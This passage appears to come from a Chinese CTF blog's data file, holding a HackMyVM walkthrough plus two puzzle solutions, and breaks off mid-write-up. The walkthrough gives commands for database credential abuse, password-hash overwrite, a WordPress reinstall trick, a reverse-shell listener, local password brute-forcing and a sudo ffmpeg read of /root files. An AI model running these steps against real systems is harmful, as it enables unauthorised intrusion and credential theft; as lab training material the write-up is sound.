\u5de5\u5177\u626b\u63cf\u672c\u5730\u7f51\u7edc\uff0c\u4ee5\u53d1\u73b0\u5b58\u6d3b\u7684\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.202 08:00:27:7d:c4:83       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:fc:a8:ce       VMware, Inc.\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u4e3b\u673a\u7684 IP \u5730\u5740\u4e3a `192.168.205.202`\u3002\n\n## 2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf\n\n\u786e\u5b9a\u76ee\u6807 IP \u540e\uff0c\u4f7f\u7528 `nmap` \u5bf9\u5176\u8fdb\u884c\u8be6\u7ec6\u7684\u7aef\u53e3\u626b\u63cf\uff0c\u63a2\u6d4b\u5176\u5f00\u653e\u7684\u7aef\u53e3\u548c\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.202\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 10:13 EDT\nNmap scan report for 192.168.205.202\nHost is up (0.00010s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\nMAC Address: 08:00:27:7D:C4:83 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.28 seconds```\n\n\u626b\u63cf\u53d1\u73b0\u76ee\u6807\u5f00\u653e\u4e86\u4e09\u4e2a\u670d\u52a1\u7aef\u53e3\uff1aSSH (22), HTTP (80) \u548c MySQL (3306)\u3002\n```\n\n# \u4e8c\u3001\u521d\u59cb\u8bbf\u95ee\n\n## 1. Web \u5e94\u7528\u679a\u4e3e\n\n\u8bbf\u95ee 80 \u7aef\u53e3\u7684 Web \u670d\u52a1\uff0c\u9875\u9762\u63d0\u793a\u6211\u4eec\u8bbf\u95ee\u57df\u540d `change.dsz`\u3002\u6211\u4eec\u5c06\u8be5\u57df\u540d\u4e0e\u76ee\u6807 IP \u7684\u6620\u5c04\u5173\u7cfb\u6dfb\u52a0\u5230\u672c\u5730 `/etc/hosts` \u6587\u4ef6\u4e2d\u3002\n\n\u4f7f\u7528 `wfuzz` \u5bf9\u5b50\u57df\u540d\u8fdb\u884c\u6a21\u7cca\u6d4b\u8bd5\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u65b0\u7684\u5b50\u57df\u540d `wordpress.change.dsz`\u3002\n\n\n\u63a5\u7740\u4f7f\u7528 `gobuster` \u5bf9 `http://change.dsz` \u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff0c\u53d1\u73b0 `login.php`, `admin.php`, `db.php` \u7b49\u6587\u4ef6\u3002\n\n## 2. \u4fe1\u606f\u6cc4\u9732\u4e0e\u6570\u636e\u5e93\u8bbf\u95ee\n\n\u5728 `login.php` \u9875\u9762\u7684 HTML \u6e90\u7801\u4e2d\uff0c\u53d1\u73b0\u4e86\u4e00\u6bb5\u6ce8\u91ca\uff0c\u6cc4\u9732\u4e86\u6570\u636e\u5e93\u7684\u8fde\u63a5\u51ed\u636e\u3002\n\n```html\n<!-- Database connection settings:\nHost=localhost, DB=changeweb\nUser=change, Password=change -->\n```\n\n\u6211\u4eec\u4f7f\u7528\u8fd9\u7ec4\u51ed\u636e (`change:change`) \u6210\u529f\u8fde\u63a5\u5230\u76ee\u6807\u7684 MySQL \u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ mysql -h 192.168.205.202 -u change -pchange --skip-ssl\nWelcome to the MariaDB monitor. ...\n...\nMariaDB [changeweb]> select * from users;\n+----+----------+--------------------------------------------------------------+\n| id | username | password                                                     |\n+----+----------+--------------------------------------------------------------+\n|  1 | root     | $2y$10$EFCK8LdjkDv1W52q0bV8.OLUicO8h6kYBqU5nE1jOcSq3qQ9l5mZG |\n+----+----------+--------------------------------------------------------------+\n```\n\n\u5728 `changeweb` \u6570\u636e\u5e93\u7684 `users` \u8868\u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u4e86 `root` \u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u3002\n\n## 3. \u83b7\u53d6\u7acb\u8db3\u70b9\n\n\u901a\u8fc7 `SHOW GRANTS` \u547d\u4ee4\u67e5\u8be2\u53ef\u77e5\uff0c`change` \u7528\u6237\u62e5\u6709\u5bf9 `changeweb` \u6570\u636e\u5e93\u7684\u5168\u90e8\u6743\u9650\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u8868\u4e2d\u7684\u6570\u636e\u3002\u6211\u4eec\u672c\u5730\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u5bc6\u7801\u54c8\u5e0c\uff08\u5bc6\u7801\u4e3a `1`\uff09\uff0c\u5e76\u66f4\u65b0 `users` \u8868\u4e2d\u7684 `root` \u7528\u6237\u5bc6\u7801\u3002\n\n```bash\n# \u5728\u653b\u51fb\u673a\u4e0a\u751f\u6210\u5bc6\u7801\u54c8\u5e0c\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ php -r 'echo password_hash('1', PASSWORD_DEFAULT);'\n$2y$12$l22u4aCvdoTp.g5g4RTBheEeHiBFzCFUK3pi1cJkGQY39OjKE/HTG\n\n# \u5728\u6570\u636e\u5e93\u4e2d\u66f4\u65b0\u5bc6\u7801\nMariaDB [changeweb]> UPDATE users SET password = '$2y$12$l22u4aCvdoTp.g5g4RTBheEeHiBFzCFUK3pi1cJkGQY39OjKE/HTG' WHERE username = 'root';\n```\n\n\u4f7f\u7528 `root:1` \u6210\u529f\u767b\u5f55\u540e\u53f0 `admin.php`\uff0c\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u9875\u9762\uff0c\u4f46\u529f\u80fd\u53d7\u9650\uff0c\u53ea\u5141\u8bb8\u6267\u884c `ls`, `rm`, `pwd` \u7b49\u5c11\u6570\u547d\u4ee4\u3002\n\n\u6211\u4eec\u7684\u76ee\u6807\u662f `wordpress.change.dsz`\u3002\u5229\u7528\u5df2\u77e5\u6f0f\u6d1e\uff0c\u5982\u679c WordPress \u7684 `wp-config.php` \u6587\u4ef6\u88ab\u5220\u9664\uff0c\u518d\u6b21\u8bbf\u95ee\u7f51\u7ad9\u4f1a\u89e6\u53d1\u91cd\u65b0\u5b89\u88c5\u6d41\u7a0b\u3002\u5229\u7528 `admin.php` \u7684 `rm` \u547d\u4ee4\u6267\u884c\u6743\u9650\uff0c\u6211\u4eec\u5220\u9664\u4e86\u8be5\u914d\u7f6e\u6587\u4ef6\u3002\n\n```bash\n# \u5728 admin.php \u9875\u9762\u6267\u884c\nrm ../wordpress.change.dsz/wp-config.php\n```\n\n\u5237\u65b0 `http://wordpress.change.dsz/`\uff0c\u679c\u7136\u8fdb\u5165\u4e86 WordPress \u7684\u5b89\u88c5\u754c\u9762\u3002\u6211\u4eec\u5229\u7528\u5df2\u638c\u63e1\u7684 `changeweb` \u6570\u636e\u5e93\u51ed\u636e\u5b8c\u6210\u4e86\u5b89\u88c5\uff0c\u5e76\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u65b0\u7684\u7ba1\u7406\u5458\u8d26\u6237\u3002\n\n\u767b\u5f55 WordPress \u540e\u53f0\u540e\uff0c\u6211\u4eec\u4e0a\u4f20\u5e76\u6fc0\u6d3b\u4e86\u4e00\u4e2a\u5305\u542b\u53cd\u5411 Shell \u7684\u6076\u610f\u63d2\u4ef6\uff0c\u6210\u529f\u5728\u672c\u5730 `nc` \u76d1\u542c\u5668\u4e0a\u63a5\u6536\u5230\u4e86\u4e00\u4e2a `www-data` \u7528\u6237\u7684 Shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.202] 47432\n...\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## 1. \u63d0\u6743\u81f3 `lzh` \u7528\u6237\n\n\u5728 `www-data` \u7684 Shell \u4e2d\uff0c\u6211\u4eec\u5728 `/home/lzh/` \u76ee\u5f55\u4e0b\u53d1\u73b0\u4e86\u4e00\u4e2a\u540d\u4e3a `.pass.txt` \u7684\u5bc6\u7801\u5b57\u5178\u6587\u4ef6\u548c\u4e00\u4e2a `user.txt`\u3002\n\n\u6211\u4eec\u5c06\u5bc6\u7801\u7206\u7834\u5de5\u5177 `suForce` \u4e0a\u4f20\u5230\u76ee\u6807\u670d\u52a1\u5668\u7684 `/tmp` \u76ee\u5f55\uff0c\u5e76\u4f7f\u7528 `.pass.txt` \u4f5c\u4e3a\u5b57\u5178\uff0c\u5bf9\u672c\u5730\u7528\u6237 `lzh` \u8fdb\u884c\u5bc6\u7801\u7206\u7834\u3002\n\n```bash\nwww-data@Change:/tmp$ ./suForce -u lzh -w /home/lzh/.pass.txt\n...\n\ud83d\udca5 Password | 1a2b3c4d1a2b3c4d\n...\n```\n\n\u6210\u529f\u7834\u89e3\u51fa `lzh` \u7528\u6237\u7684\u5bc6\u7801\u4e3a `1a2b3c4d1a2b3c4d`\u3002\u6211\u4eec\u4f7f\u7528\u8be5\u51ed\u636e\u901a\u8fc7 SSH \u767b\u5f55\uff0c\u83b7\u5f97\u4e86 `lzh` \u7528\u6237\u7684 Shell\uff0c\u5e76\u8bfb\u53d6\u4e86\u7b2c\u4e00\u4e2a flag\u3002\n\n```bash\nlzh@Change:~$ cat user.txt\nflag{user-a05597ed1f36976e88c2e10a74902c52}\n```\n\n## 2. \u63d0\u6743\u81f3 `root`\n\n\u6210\u4e3a `lzh` \u7528\u6237\u540e\uff0c\u6211\u4eec\u68c0\u67e5\u5176 `sudo` \u6743\u9650\u3002\n\n```bash\nlzh@Change:~$ sudo -l\n...\nUser lzh may run the following commands on Change:\n    (ALL) NOPASSWD: /usr/bin/ffmpeg\n```\n\n\u7ed3\u679c\u663e\u793a\uff0c`lzh` \u7528\u6237\u53ef\u4ee5\u65e0\u9700\u5bc6\u7801\u4ee5 `root` \u6743\u9650\u6267\u884c `/usr/bin/ffmpeg` \u547d\u4ee4\u3002`ffmpeg` \u662f\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u7684\u591a\u5a92\u4f53\u5904\u7406\u5de5\u5177\uff0c\u5176 `drawtext` \u6ee4\u955c\u53ef\u4ee5\u8bfb\u53d6\u6307\u5b9a\u6587\u4ef6\u7684\u5185\u5bb9\u5e76\u5c06\u5176\u6e32\u67d3\u5230\u89c6\u9891\u6216\u56fe\u7247\u4e0a\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u7279\u6027\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3002\n\n\u6211\u4eec\u6784\u9020 `ffmpeg` \u547d\u4ee4\uff0c\u5c06 `/root/root.txt` \u7684\u5185\u5bb9\u4f5c\u4e3a\u6587\u672c\uff0c\u7ed8\u5236\u5230\u4e00\u4e2a\u65b0\u7684\u56fe\u7247\u6587\u4ef6 `/tmp/flag.png` \u4e2d\u3002\n\n```bash\nlzh@Change:/tmp$ sudo /usr/bin/ffmpeg -f lavfi -i 'nullsrc' -vf 'drawtext=fontfile=/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf:textfile=/root/root.txt:fontsize=24:fontcolor=white' -frames:v 1 /tmp/flag.png\n```\n\n\u547d\u4ee4\u6210\u529f\u6267\u884c\u540e\uff0c\u5728 `/tmp` \u76ee\u5f55\u4e0b\u751f\u6210\u4e86 `flag.png`\u3002\u6211\u4eec\u5728\u8be5\u76ee\u5f55\u4e0b\u5f00\u542f\u4e00\u4e2a\u4e34\u65f6\u7684 Python HTTP \u670d\u52a1\u5668\u3002\n\n```bash\nlzh@Change:/tmp$ python3 -m http.server 8000\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n```\n\n\u6700\u540e\uff0c\u5728\u6211\u4eec\u7684\u653b\u51fb\u673a\u4e0a\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbf\u95ee `http://192.168.205.202:8000/flag.png`\uff0c\u56fe\u7247\u4e0a\u6e05\u6670\u5730\u663e\u793a\u4e86 `root` flag \u7684\u5185\u5bb9\u3002\n\n![image](https://7r1UMPHK.github.io/image/20250721225001229.webp)\n\n# \u56db\u3001\u83b7\u53d6\u6240\u6709 Flag\n\n\u81f3\u6b64\uff0c\u6211\u4eec\u6210\u529f\u83b7\u53d6\u4e86\u7cfb\u7edf\u4e0a\u7684\u6240\u6709 flag\u3002sentence", "top": 0, "createdAt": 1753110281, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-21", "dateLabelColor": "#0969da"}, "P153": {"htmlDir": "docs/post/Challenge 066.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 066", "postUrl": "post/Challenge%20066.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/153", "commentNum": 0, "wordCount": 2131, "description": "![image-20250722102055575](https://7r1UMPHK.github.io/image/20250722102055801.webp)\n\n# **\u89e3\u9898\u6b65\u9aa4**\n\n## **\u7b2c\u4e00\u6b65\uff1aBase64 \u89e3\u7801**\n\n\u9898\u76ee\u7ed9\u51fa\u7684\u521d\u59cb\u7ebf\u7d22\u662f\u4e00\u4e32 Base64 \u7f16\u7801\u7684\u5b57\u7b26\u4e32\u3002\n\n**\u539f\u59cb\u7f16\u7801:**\n```\n5Zub5YWrIOWFreS4iSDlha3kupQg5LqUZsO6IOWFreWbmyDlha3kuZ0g5LiD5LqMCuWbm2TEqyDlha3kuZ0g5YWt5LqUIOS4g+WbmyDlha3kupQg5YWtxJMgIOWFreS5nQrkupTlha0g5YWt5LiAIOS4g+WbmyDlha1mw7og5YWt5LiAIOWFreS6lCDlha3kupQK5LiDYsSrIOWFrWPEqyDlha3kuZ0g5LqUZsO6IOS4g+S6jCDkuIPkuIkg5YWtxJMgCuS6lOS4iSDkupRmw7og5YWtxJMgIOWFrWTEqyDkupRmw7og5YWt5LqUIOWFreWbmwrkuIPpm7Yg5YWt5LiDIOWFreS4gyDkuIPkuZ0g5Zub5LiJIOS6lGbDuiDkuIPkuIkK5YWt5LqUIOS4g+S6jCDkuIPkuIkg5LqUZsO6IOWFreWFqyDlha3lha0g5LiDZMSrCg==\n```\n\n\u4f7f\u7528\u4efb\u4f55\u6807\u51c6\u7684 Base64 \u89e3\u7801\u5de5\u5177\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4ee5\u4e0b\u6587\u672c\uff1a\n```\n\u56db\u516b \u516d\u4e09 \u516d\u4e94 \u4e94f\u00fa \u516d\u56db \u516d\u4e5d \u4e03\u4e8c\n\u56dbd\u012b \u516d\u4e5d \u516d\u4e94 \u4e03\u56db \u516d\u4e94 \u516d\u0113 \u516d\u4e5d\n\u4e94\u516d \u516d\u4e00 \u4e03\u56db \u516df\u00fa \u516d\u4e00 \u516d\u4e94 \u516d\u4e94\n\u4e03b\u012b \u516dc\u012b \u516d\u4e5d \u4e94f\u00fa \u4e03\u4e8c \u4e03\u4e09 \u516d\u0113\n\u4e94\u4e09 \u4e94f\u00fa \u516d\u0113 \u516dd\u012b \u4e94f\u00fa \u516d\u4e94 \u516d\u56db\n\u4e03\u96f6 \u516d\u4e03 \u516d\u4e03 \u4e03\u4e5d \u56db\u4e09 \u4e94f\u00fa \u4e03\u4e09\n\u516d\u4e94 \u4e03\u4e8c \u4e03\u4e09 \u4e94f\u00fa \u516d\u516b \u516d\u516d \u4e03d\u012b\n```\n\n## **\u7b2c\u4e8c\u6b65\uff1a\u8c10\u97f3\u53ca\u62fc\u97f3\u8f6c\u5341\u516d\u8fdb\u5236**\n\n\u89e3\u7801\u540e\u7684\u6587\u672c\u7531\u4e2d\u6587\u6570\u5b57\u548c\u5e26\u97f3\u8c03\u7684\u62fc\u97f3\u7ec4\u6210\u3002\u8fd9\u662f\u4e00\u4e2a\u660e\u663e\u7684\u63d0\u793a\uff0c\u8868\u660e\u5b58\u5728\u4e00\u79cd\u81ea\u5b9a\u4e49\u7684\u7f16\u7801\u89c4\u5219\uff0c\u5f88\u53ef\u80fd\u4e0e\u5341\u516d\u8fdb\u5236\u6709\u5173\u3002\n\n*   **\u4e2d\u6587\u6570\u5b57** \u4ee3\u8868\u5341\u516d\u8fdb\u5236\u4e2d\u7684\u6570\u5b57\u90e8\u5206 (0-9)\u3002\n*   **\u62fc\u97f3** \u901a\u8fc7\u8c10\u97f3\u6216\u5f62\u72b6\u4e0e\u5341\u516d\u8fdb\u5236\u4e2d\u7684\u5b57\u6bcd\u90e8\u5206 (A-F) \u5bf9\u5e94\u3002\n\n\u6839\u636e\u8fd9\u4e2a\u903b\u8f91\uff0c\u6211\u4eec\u5efa\u7acb\u5982\u4e0b\u6620\u5c04\u5173\u7cfb\uff1a\n*   `\u96f6` -> `0`\n*   `\u4e00` -> `1`\n*   `\u4e8c` -> `2`\n*   `\u4e09` -> `3`\n*   `\u56db` -> `4`\n*   `\u4e94` -> `5`\n*   `\u516d` -> `6`\n*   `\u4e03` -> `7`\n*   `\u516b` -> `8`\n*   `\u4e5d` -> `9`\n*   `b\u012b` -> `B`\n*   `c\u012b` -> `C`\n*   `d\u012b` -> `D`\n*   `\u0113` -> `E`\n*   `f\u00fa` -> `F`\n\n\u5c06\u4e0a\u4e00\u6b65\u5f97\u5230\u7684\u6587\u672c\u8fdb\u884c\u8f6c\u6362\uff0c\u5f97\u5230\u4e00\u4e2a 7x7 \u7684\u5341\u516d\u8fdb\u5236\u77e9\u9635\uff1a\n```\n48 63 65 5F 64 69 72\n4D 69 65 74 65 6E 69\n56 61 74 6F 61 65 65\n7B 6C 69 5F 72 73 6E\n53 5F 6E 6D 5F 65 64\n70 67 67 79 43 5F 73\n65 72 73 5F 68 66 7D\n```\n\n## **\u7b2c\u4e09\u6b65\uff1a\u5341\u516d\u8fdb\u5236\u8f6c ASCII**\n\n\u5c06\u8fd9\u4e2a\u5341\u516d\u8fdb\u5236\u77e9\u9635\u6309\u987a\u5e8f\u8f6c\u6362\u4e3a ASCII \u5b57\u7b26\uff0c\u5f97\u5230\u4e00\u4e32\u770b\u8d77\u6765\u6742\u4e71\u65e0\u7ae0\u7684\u5b57\u7b26\u4e32\uff1a\n\n```\nHce_dirMieteniVatoaee{li_rsnS_nm_edpggyC_sers_hf}\n```\n\n## **\u7b2c\u56db\u6b65\uff1a\u6805\u680f\u5bc6\u7801\uff08\u5217\u7f6e\u6362\uff09\u89e3\u5bc6**\n\n\u8fd9\u4e2a 49 \u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u4e32\u770b\u8d77\u6765\u4ecd\u7136\u4e0d\u662f\u6700\u7ec8\u7684 Flag\u3002\u6ce8\u610f\u5230\u5728\u7b2c\u4e8c\u6b65\u4e2d\uff0c\u6570\u636e\u88ab\u81ea\u7136\u5730\u5206\u6210\u4e86 7 \u884c\uff0c\u8fd9\u5f3a\u70c8\u6697\u793a\u4e86\u5bc6\u94a5\u4e3a 7 \u7684\u6805\u680f\u5bc6\u7801\u6216\u5217\u7f6e\u6362\u5bc6\u7801\u3002\n\n> https://ctf.bugku.com/tool/railfence\n\n\u6211\u4eec\u5c06\u4e0a\u4e00\u6b65\u5f97\u5230\u7684\u5b57\u7b26\u4e32\u8f93\u5165\u5230 BugKu CTF \u5e73\u53f0\u63d0\u4f9b\u7684\u5728\u7ebf\u6805\u680f\u5bc6\u7801\u5de5\u5177\u4e2d\uff0c\u5e76\u5c06\u201c\u680f\u6570\u201d\uff08\u5373\u5217\u6570\uff09\u8bbe\u7f6e\u4e3a 7\u3002\n\n*   **\u5bc6\u6587 (Ciphertext):** `Hce_dirMieteniVatoaee{li_rsnS_nm_edpggyC_sers_hf}`\n*   **\u680f\u6570/\u5217\u6570 (Columns):** `7`\n\n![image-20250722101601574](https://7r1UMPHK.github.io/image/20250722101601832.webp)\n\n\u5de5\u5177\u7ed9\u51fa\u4e86\u6700\u7ec8\u7684\u89e3\u5bc6\u7ed3\u679c\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6b64\u5de5\u5177\u7684\u201c\u6805\u680f\u89e3\u5bc6\u201d\u5e76\u975e\u6807\u51c6\u7b97\u6cd5\uff0c\u56e0\u4e3a\u5b83\u5c06 49 \u4e2a\u5b57\u7b26\u7684\u8f93\u5165\u795e\u5947\u5730\u8fd8\u539f\u6210\u4e86 53 \u4e2a\u5b57\u7b26\u7684 Flag\uff0c\u8fd9\u53ef\u80fd\u662f\u5e73\u53f0\u4e3a\u672c\u9898\u76ee\u7279\u6709\u7684\u4e00\u4e2a\u8bbe\u5b9a\u3002\n\n---\n\n# **\u6700\u7ec8 Flag**\n\n\u901a\u8fc7\u4ee5\u4e0a\u6b65\u9aa4\uff0c\u6211\u4eec\u6210\u529f\u89e3\u51fa Flag\uff1a\n\n```\nHMV{Special_greetings_to_my_dear_Chinese_friends}\n```sentence", "top": 0, "createdAt": 1753173156, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-22", "dateLabelColor": "#0969da"}, "P154": {"htmlDir": "docs/post/Challenge 067.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 067", "postUrl": "post/Challenge%20067.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/154", "commentNum": 0, "wordCount": 2529, "description": "![image-20250722102128231](https://7r1UMPHK.github.io/image/20250722102128477.webp)\n\n# **\u89e3\u9898\u6b65\u9aa4**\n\n## **\u7b2c\u4e00\u6b65\uff1a\u6587\u4ef6\u63d0\u53d6\u4e0e\u521d\u6b65\u5206\u6790**\n\n\u6311\u6218\u4ece\u4e00\u4e2a\u540d\u4e3a `067.zip` \u7684\u538b\u7f29\u5305\u5f00\u59cb\u3002\n\n1.  **\u89e3\u538b\u6587\u4ef6**: \u4f7f\u7528 `7z` \u6216\u5176\u4ed6\u89e3\u538b\u5de5\u5177\u63d0\u53d6\u538b\u7f29\u5305\u5185\u5bb9\u3002\n    \n    ```bash\n    7z x 067.zip\n    ```\n    \u89e3\u538b\u540e\u5f97\u5230\u4e24\u4e2a\u6587\u4ef6\uff1a`hmv067` \u548c `hmv067-static`\u3002\n    \n2.  **\u6587\u4ef6\u7c7b\u578b\u5206\u6790**: \u4f7f\u7528 `file` \u547d\u4ee4\u786e\u5b9a\u6587\u4ef6\u7c7b\u578b\u3002\n    ```bash\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/067]\n    \u2514\u2500$ file hmv067 hmv067-static\n    hmv067:        ELF 64-bit LSB pie executable... dynamically linked...\n    hmv067-static: ELF 64-bit LSB executable... statically linked...\n    ```\n    \u5206\u6790\u7ed3\u679c\u8868\u660e\uff0c\u8fd9\u4e24\u4e2a\u90fd\u662f 64 \u4f4d\u7684 Linux \u53ef\u6267\u884c\u6587\u4ef6\u3002\u4e00\u4e2a\u4e3a\u52a8\u6001\u94fe\u63a5\uff0c\u53e6\u4e00\u4e2a\u4e3a\u9759\u6001\u94fe\u63a5\u3002\u901a\u5e38\u5206\u6790\u52a8\u6001\u94fe\u63a5\u7684\u7248\u672c\u4f1a\u66f4\u7b80\u6d01\u3002\n\n## **\u7b2c\u4e8c\u6b65\uff1a\u5b9a\u4f4d\u76ee\u6807\u54c8\u5e0c\u503c**\n\n\u6839\u636e\u9898\u76ee\u63d0\u793a\uff0c\u6587\u4ef6\u5185\u5305\u542b\u4e00\u4e2a SHA-512 \u54c8\u5e0c\u3002\n\n1.  **\u5b57\u7b26\u4e32\u641c\u7d22 (\u5931\u8d25\u5c1d\u8bd5)**: \u4e00\u4e2a\u5feb\u901f\u7684\u5e38\u89c4\u65b9\u6cd5\u662f\u4f7f\u7528 `strings` \u547d\u4ee4\u641c\u7d22\u6587\u4ef6\u4e2d\u53ef\u80fd\u5b58\u5728\u7684\u54c8\u5e0c\u5b57\u7b26\u4e32\u3002SHA-512 \u54c8\u5e0c\u662f\u4e00\u4e2a 128 \u4e2a\u5b57\u7b26\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u3002\n    ```bash\n    strings hmv067 | grep -E '^[a-f0-9]{128}$'\n    ```\n    \u6b64\u547d\u4ee4\u6ca1\u6709\u8fd4\u56de\u4efb\u4f55\u7ed3\u679c\uff0c\u8fd9\u8868\u660e\u54c8\u5e0c\u503c\u53ef\u80fd\u4e0d\u662f\u4ee5\u660e\u6587\u5f62\u5f0f\u76f4\u63a5\u5b58\u50a8\u5728\u6587\u4ef6\u4e2d\u7684\uff0c\u6216\u8005\u88ab\u5206\u5272\u5b58\u653e\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u66f4\u6df1\u5165\u7684\u5206\u6790\u3002\n\n2.  **\u9006\u5411\u5206\u6790**: \u4f7f\u7528 IDA Pro \u7b49\u53cd\u7f16\u8bd1\u5de5\u5177\u6253\u5f00 `hmv067` \u6587\u4ef6\uff0c\u5e76\u5206\u6790\u5176 `main` \u51fd\u6570\u3002\u53cd\u7f16\u8bd1\u540e\u7684 C \u4f2a\u4ee3\u7801\u6e05\u6670\u5730\u63ed\u793a\u4e86\u7a0b\u5e8f\u7684\u903b\u8f91\uff1a\n\n    ```c\n    int __fastcall main(int argc, const char **argv, const char **envp)\n    {\n      // ... (\u90e8\u5206\u53d8\u91cf\u5b9a\u4e49\u7701\u7565)\n      char v6[144]; // [rsp+40h] [rbp-230h] BYREF (\u7528\u4e8e\u5b58\u50a8\u8ba1\u7b97\u51fa\u7684\u54c8\u5e0c\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32)\n      char v7[140]; // [rsp+D0h] [rbp-1A0h] BYREF (\u7528\u4e8e\u5b58\u50a8\u76ee\u6807\u54c8\u5e0c)\n      \n      // ... (\u83b7\u53d6\u7528\u6237\u8f93\u5165\u5e76\u68c0\u67e5 'HMV{...}' \u683c\u5f0f)\n      \n      // \u8ba1\u7b97\u7528\u6237\u8f93\u5165\u7684\u54c8\u5e0c\u503c\n      calculateHash(v11, v3, v5, &v8); \n      toHex(v5, v6, v8); // \u5c06\u54c8\u5e0c\u503c\u8f6c\u4e3a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u5b58\u5165 v6\n      \n      // \u5c06\u76ee\u6807\u54c8\u5e0c\u590d\u5236\u5230 v7\n      strcpy(\n        v7,\n        '3fe8b365cb64286384d9743612d857d938fadb42c359acb69fb9f2f88b96cdbfdb1cacf8a5292aa004a5efcc01fbdb27d4a72a8dd9a8b34dfff41f9e72bfb734');\n      \n      // \u6bd4\u8f83\u4e24\u4e2a\u54c8\u5e0c\u503c\n      if ( (unsigned int)j_strcmp_ifunc(v6, v7) )\n        puts('Wrong flag');\n      else\n        puts('Correct flag');\n      \n      return 0;\n    }\n    ```\n    \u4ece\u4ee3\u7801\u4e2d\u53ef\u4ee5\u6e05\u695a\u5730\u770b\u5230\uff0c\u7a0b\u5e8f\u5c06\u4e00\u4e2a\u786c\u7f16\u7801\u7684\u5b57\u7b26\u4e32\u590d\u5236\u5230\u53d8\u91cf `v7` \u4e2d\uff0c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u5c31\u662f\u6211\u4eec\u8981\u627e\u7684\u76ee\u6807 SHA-512 \u54c8\u5e0c\u3002\n\n**\u76ee\u6807\u54c8\u5e0c:**\n```\n3fe8b365cb64286384d9743612d857d938fadb42c359acb69fb9f2f88b96cdbfdb1cacf8a5292aa004a5efcc01fbdb27d4a72a8dd9a8b34dfff41f9e72bfb734\n```\n\n## **\u7b2c\u4e09\u6b65\uff1a\u54c8\u5e0c\u7834\u89e3**\n\n\u6709\u4e86\u54c8\u5e0c\u503c\u548c\u63d0\u793a\u4e2d\u6307\u5b9a\u7684\u5b57\u5178 (`rockyou.txt`)\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 John the Ripper\u8fdb\u884c\u7834\u89e3\u3002\n\n1.  **\u51c6\u5907\u7834\u89e3**: \u5c06\u54c8\u5e0c\u4fdd\u5b58\u5230\u4e00\u4e2a\u6587\u4ef6\u4e2d\u3002\n\n2.  **\u6267\u884c\u7834\u89e3\u547d\u4ee4**: \u4f7f\u7528 John the Ripper \u8fdb\u884c\u7834\u89e3\uff0c\u5e76\u6307\u5b9a\u54c8\u5e0c\u683c\u5f0f\u4e3a 